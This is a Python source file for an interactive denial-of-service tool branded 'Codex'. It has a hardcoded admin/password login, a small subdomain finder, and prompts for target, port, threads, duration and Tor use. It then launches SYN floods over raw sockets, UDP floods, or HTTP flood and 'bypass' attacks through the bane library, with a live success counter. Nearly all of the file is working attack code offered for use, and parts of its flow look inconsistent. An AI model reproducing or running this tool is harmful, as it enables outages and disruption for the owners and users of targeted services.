import bane, sys, socket, time, threading
from concurrent.futures import ThreadPoolExecutor

if sys.version_info < (3, 0):
    input = raw_input

# Define ANSI color codes for styling
class Colors:
    RESET = '\033[0m'
    RED = '\033[38;5;196m'
    GREEN = '\033[38;5;82m'
    BLUE = '\033[38;5;75m'
    YELLOW = '\033[38;5;226m'
    WHITE = '\033[38;5;15m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ITALIC = '\033[3m'
    DARK_GREEN = '\033[38;5;82m'  # Dark green

def print_banner():
    banner = f"""
{Colors.RED} 
   ______              __              
  / ____/  ____   ____/ /  ___    _  __
 / /      / __ \ / __  /  / _ \  | |/_/
/ /___   / /_/ // /_/ /  /  __/ _>  <  
\____/   \____/ \__,_/   \___/ /_/|_|  
                                                                                           
{Colors.RESET}
    """
    print(banner)

def loading_animation(duration):
    chars = "/—\\|"
    for _ in range(duration * 2):
        for char in chars:
            sys.stdout.write(f'\r{Colors.GREEN}Loading {char}{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(0.1)
    sys.stdout.write('\r' + ' ' * 20 + '\r')  # Clear the line
    print(f"{Colors.GREEN}Powered By VeerOG{Colors.RESET}")

def animated_input(prompt):
    for char in prompt:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.02)
    return input()

def get_user_input(prompt, valid_condition, error_message):
    while True:
        try:
            value = animated_input(prompt)
            if valid_condition(value):
                return value
        except:
            pass
        print(f"{Colors.RED}{error_message}{Colors.RESET}\n")

def get_numeric_input(prompt, min_value, max_value):
    return int(get_user_input(
        prompt,
        lambda x: min_value <= int(x) <= max_value,
        f"Please enter a valid choice between {min_value} and {max_value}."
    ))

def get_choice_input(prompt, choices):
    return get_user_input(
        prompt,
        lambda x: x.lower() in choices,
        f"Please enter a valid choice: {', '.join(choices)}."
    ).lower()

def login():
    valid_username = "admin"
    valid_password = "password"

    print_banner()
    print(f"{Colors.GREEN}Welcome! Please log in to continue.{Colors.RESET}\n")
    username = get_user_input(
        f"{Colors.DARK_GREEN}Username: {Colors.WHITE}",
        lambda x: x == valid_username,
        f"{Colors.RED}Invalid username.{Colors.RESET}"
    )
    password = get_user_input(
        f"{Colors.DARK_GREEN}Password: {Colors.WHITE}",
        lambda x: x == valid_password,
        f"{Colors.RED}Invalid password.{Colors.RESET}"
    )

    print(f"{Colors.GREEN}Login successful!{Colors.RESET}\n")
    loading_animation(3)

# Main program starts here
login()

# Print the banner
print_banner()

# Subdomain Finder function
def find_subdomains(domain):
    # Placeholder list of subdomains
    subdomains = [
        "www", "mail", "ftp", "admin", "blog", "test", "dev", "stage", "shop"
    ]
    found_subdomains = []

    # Dummy check for subdomains (replace with real check)
    for sub in subdomains:
        full_subdomain = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(full_subdomain)
            found_subdomains.append(full_subdomain)
        except socket.gaierror:
            pass  # Subdomain does not exist

    return found_subdomains

# Subdomain finder feature
subdomain_finder_choice = get_choice_input(
    f"{Colors.DARK_GREEN}Do you want to find subdomains? (yes / no): {Colors.WHITE}",
    ['yes', 'no', 'y', 'n']
) in ['yes', 'y']

if subdomain_finder_choice:
    domain = get_user_input(
        f"{Colors.DARK_GREEN}Enter the domain name: {Colors.WHITE}",
        lambda x: x and '.' in x,
        f"{Colors.RED}Please enter a valid domain name.{Colors.RESET}"
    )
    found_subdomains = find_subdomains(domain)
    print(f"{Colors.GREEN}Found subdomains:{Colors.RESET}")
    for subdomain in found_subdomains:
        print(f"{Colors.YELLOW}{subdomain}{Colors.RESET}")
    print()

# Get target IP address
target = get_user_input(
    f"{Colors.DARK_GREEN}Target IP address: {Colors.WHITE}",
    lambda x: socket.gethostbyname(x),
    f"{Colors.RED}Please enter a valid IP address.{Colors.RESET}"
)

# Add space between questions
print()

# Get port number
port = get_numeric_input(
    f"{Colors.DARK_GREEN}Port (number between 1 - 65535): {Colors.WHITE}",
    1, 65535
)

# Add space between questions
print()

# Get number of threads
threads_count = get_numeric_input(
    f"{Colors.DARK_GREEN}Number of threads (1 - 1000): {Colors.WHITE}",
    1, 1000
)

# Add space between questions
print()

# Get timeout value
timeout = get_numeric_input(
    f"{Colors.DARK_GREEN}Timeout (number between 1 - 30): {Colors.WHITE}",
    1, 30
)

# Add space between questions
print()

# Get attack duration
duration = get_numeric_input(
    f"{Colors.DARK_GREEN}Attack duration in seconds (1 - 1000000): {Colors.WHITE}",
    1, 1000000
)

# Add space between questions
print()

# Check if stressing (Tor) is enabled
tor = get_choice_input(
    f"{Colors.DARK_GREEN}Is Stressing enabled? (yes / no): {Colors.WHITE}",
    ['yes', 'no', 'y', 'n']
) in ['yes', 'y']

# Add space between questions
print()

# Choose attack method
method = get_numeric_input(
    f"{Colors.DARK_GREEN}Attack method:\n\t1 - Small attack\n\t2 - Medium attack\n\t3 - Ultra-high\n\t4 - SYN flood\n\t5 - UDP flood\n=> {Colors.WHITE}",
    1, 5
)

# Add space between questions
print()

# Enable bypass mode
spam_mode = get_choice_input(
    f"{Colors.DARK_GREEN}Do you want to enable 'bypass' mode? (yes / no): {Colors.WHITE}",
    ['yes', 'no', 'y', 'n']
) in ['yes', 'y']

# Function to perform SYN flood attack
def syn_flood(target_ip, target_port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    client.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    timeout = time.time() + duration
    while time.time() < timeout:
        ip_header = bane.create_ip_header(target_ip)
        tcp_header = bane.create_tcp_header(target_ip, target_port)
        packet = ip_header + tcp_header
        client.sendto(packet, (target_ip, 0))

# Function to perform UDP flood attack
def udp_flood(target_ip, target_port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = bane.generate_payload(1024)
    timeout = time.time() + duration
    while time.time() < timeout:
        client.sendto(payload, (target_ip, target_port))

def print_monitoring_banner():
    banner = f"""
{Colors.RED}{Colors.BOLD}
 (     (           (      (                                     
 )\ )  )\ )        )\ )   )\ )    )               )       (     
(()/( (()/(       (()/(  (()/( ( /(    )  (    ( /(   (   )\ )  
 /(_)) /(_))   (   /(_))  /(_)))\())( /(  )(   )\()) ))\ (()/(  
(_))_ (_))_    )\ (_))   (_)) (_))/ )(_))(()\ (_))/ /((_) ((_)) 
 |   \ |   \  ((_)/ __|  / __|| |_ ((_)_  ((_)| |_ (_))   _| |  
 | |) || |) |/ _ \\__ \  \__ \|  _|/ _` || '_||  _|/ -_)/ _` |  
 |___/ |___/ \___/|___/  |___/ \__|\__,_||_|   \__|\___|\__,_|  
                                                                 
{Colors.RESET}
    """
    print(banner)

def monitor_attack(http_flooder_instance):
    print_monitoring_banner()
    while True:
        try:
            time.sleep(1)
            sys.stdout.write("\r{}Total: {} {}| {}Success => {} {}| {}Fails => {}{}".format(
                Colors.RED,
                http_flooder_instance.counter + http_flooder_instance.fails,
                Colors.RESET,
                Colors.GREEN,
                http_flooder_instance.counter,
                Colors.RESET,
                Colors.RED,
                http_flooder_instance.fails,
                Colors.RESET
            ))
            sys.stdout.flush()
            if http_flooder_instance.done():
                break
        except:
            break

if spam_mode:
    http_flooder_instance = bane.HTTP_Spam(target, p=port, timeout=timeout, threads=threads_count, duration=duration, tor=tor, logs=False, method=method)
else:
    if port == 443:
        target = "https://" + target + '/'
    else:
        target = "http://" + target + ':' + str(port) + '/'
    scrape_target = get_choice_input(
        f"{Colors.DARK_GREEN}Do you want to scrape the target? (yes / no): {Colors.WHITE}",
        ['yes', 'no', 'y', 'n']
    ) in ['yes', 'y']
    scraped_urls = 1
    if scrape_target:
        scraped_urls = get_numeric_input(
            f"{Colors.DARK_GREEN}How many URLs to collect? (between 1 - 20): {Colors.WHITE}",
            1, 20
        )
    http_flooder_instance = bane.HTTP_Puncher(target, timeout=timeout, threads=threads_count, duration=duration, tor=tor, logs=False, method=method, scrape_target=scrape_target, scraped_urls=scraped_urls)

print(bane.Fore.RESET)

# Start the chosen attack method
if method == 4:
    with ThreadPoolExecutor(max_workers=threads_count) as executor:
        for _ in range(threads_count):
            executor.submit(syn_flood, target, port, duration)
elif method == 5:
    with ThreadPoolExecutor(max_workers=threads_count) as executor:
        for _ in range(threads_count):
            executor.submit(udp_flood, target, port, duration)
else:
    # For HTTP Spam or Puncher attacks
    with ThreadPoolExecutor(max_workers=threads_count) as executor:
        for _ in range(threads_count):
            executor.submit(http_flooder_instance.start)

# Monitor the attack
monitor_attack(http_flooder_instance)

